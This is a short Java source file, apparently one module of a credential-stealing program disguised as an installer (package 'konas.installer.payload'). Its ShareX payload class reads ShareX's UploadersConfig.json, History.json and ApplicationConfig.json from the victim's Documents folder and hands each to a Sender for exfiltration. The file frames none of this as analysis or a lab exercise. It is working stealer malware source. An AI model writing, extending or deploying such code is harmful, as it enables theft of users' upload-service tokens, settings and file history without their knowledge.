package konas.installer.payload.impl;

import konas.installer.payload.Payload;
import konas.installer.payload.Sender;
import konas.installer.util.FileUtil;

public final class ShareX implements Payload
{
    @Override
    public void execute() throws Exception
    {
        FileUtil.getFile(System.getProperty("user.home") + "\\Documents\\ShareX\\" + "UploadersConfig.json").ifPresent(Sender::send);
        FileUtil.getFile(System.getProperty("user.home") + "\\Documents\\ShareX\\" + "History.json").ifPresent(Sender::send);
        FileUtil.getFile(System.getProperty("user.home") + "\\Documents\\ShareX\\" + "ApplicationConfig.json").ifPresent(Sender ::send);
    }
}
